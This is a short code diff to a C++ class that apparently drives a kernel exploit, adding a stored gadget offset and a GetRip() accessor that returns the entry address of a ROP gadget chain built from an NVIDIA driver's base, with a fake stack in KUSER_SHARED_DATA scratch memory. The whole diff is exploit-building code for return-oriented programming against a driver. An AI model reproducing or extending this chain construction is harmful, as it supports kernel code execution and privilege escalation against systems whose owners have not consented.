@@ -74,7 +74,8 @@ private:
     UINT64 allocPtr;    // offset from scratch base, grows up
 
     UINT64 nvidiaBase;
-    UINT64 scratchBase; // = KUSD_BASE + KUSD_SCRATCH_OFF
+    UINT64 scratchBase;
+    UINT64 g1Off; // stored so GetRip() can return gadget1 address
 
     UINT64 rax, rsi, rdx;
 
@@ -98,6 +99,7 @@ public:
     UINT64 GetRax() const { return rax; }
     UINT64 GetRsi() const { return rsi; }
     UINT64 GetRdx() const { return rdx; }
+    UINT64 GetRip() const { return nvidiaBase + g1Off; } // gadget1 — chain entry point
     UINT64 GetPopRdxValue() const { return rdx; }
     UINT64 GetRspSetupAddr() const { return scratchBase + SCRATCH_STACK_TOP; }
 
